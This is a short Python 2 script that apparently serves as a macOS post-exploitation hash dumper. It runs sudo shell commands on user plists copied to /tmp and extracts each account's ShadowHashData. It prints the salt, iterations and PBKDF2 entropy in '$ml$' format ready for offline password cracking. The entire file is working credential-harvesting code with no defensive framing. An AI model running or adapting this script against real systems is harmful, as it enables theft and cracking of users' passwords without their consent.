import os
import base64
def getUserHash(userName):
    from xml.etree import ElementTree
    try:
        raw = os.popen('sudo defaults read /tmp/%s.plist ShadowHashData|tr -dc 0-9a-f|xxd -r -p|plutil -convert xml1 - -o - 2> /dev/null' %(userName)).read()
        if len(raw) > 100:
            root = ElementTree.fromstring(raw)
            children = root[0][1].getchildren()
            entropy64 = ''.join(children[1].text.split())
            iterations = children[3].text
            salt64 = ''.join(children[5].text.split())
            entropyRaw = base64.b64decode(entropy64)
            entropyHex = entropyRaw.encode("hex")
            saltRaw = base64.b64decode(salt64)
            saltHex = saltRaw.encode("hex")
            return (userName, "$ml$%s$%s$%s" %(iterations, saltHex, entropyHex))
    except Exception as e:
        print "getUserHash() exception: %s" %(e)
        pass
userNames = [ plist.split(".")[0] for plist in os.listdir('/tmp/') if not plist.startswith('_')]
userHashes = []
for userName in userNames:
    userHash = getUserHash(userName)
    if(userHash):
        userHashes.append(getUserHash(userName))
print userHashes
